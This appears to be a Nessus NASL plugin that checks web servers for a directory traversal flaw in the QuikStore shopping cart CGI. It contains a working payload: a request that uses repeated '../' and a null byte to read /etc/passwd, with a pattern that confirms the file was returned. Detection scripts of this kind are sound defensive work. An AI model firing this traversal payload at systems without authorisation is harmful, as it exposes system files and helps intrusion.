#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Ref:
# Date: Tue, 23 Dec 2003 20:27:51 +0800
# From: Dr`Ponidi Haryanto <drponidi@hackermail.com>
# Subject: QuikStore Shopping Cart Discloses Installation Path & Files to Remote
#
#

if(description)
{
 script_id(11975);
 script_version ("$Revision: 1.6 $");
# script_bugtraq_id(9282);  # Incidentally covers bid 9282 
 
 name["english"] = "quickstore traversal (2)";
 script_name(english:name["english"]);
 
 desc["english"] = "The CGI 'quickstore.cgi' is installed. This CGI has
a well known security flaw that lets an attacker read arbitrary
files with the privileges of the http daemon (usually root or nobody).

Solution : remove it from /cgi-bin or upgrade to the latest version.

Risk factor : High";


 desc["francais"] = "Le cgi 'quickstore.cgi' est installé. Celui-ci possède
un problème de sécurité bien connu qui permet à n'importe qui de 
faire lire des fichiers  arbitraires au daemon http, avec les privilèges
de celui-ci (root ou nobody). 

Solution : retirez-le de /cgi-bin ou mettez-le à jour 

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/quickstore.cgi";
 summary["francais"] = "Vérifie la présence de /cgi-bin/quickstore.cgi";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2004 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2004 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
req = string(dir,
 "/quickstore.cgi?nessus&template=../../../../../../../../../../etc/passwd%00html");
req = http_get(item:req, port:port);
r = http_keepalive_send_recv(port:port, data:req);
if( r == NULL ) exit(0);
if(egrep(pattern:".*root:.*:0:[01]:.*", string:r)){ security_hole(port); exit(0); }
}
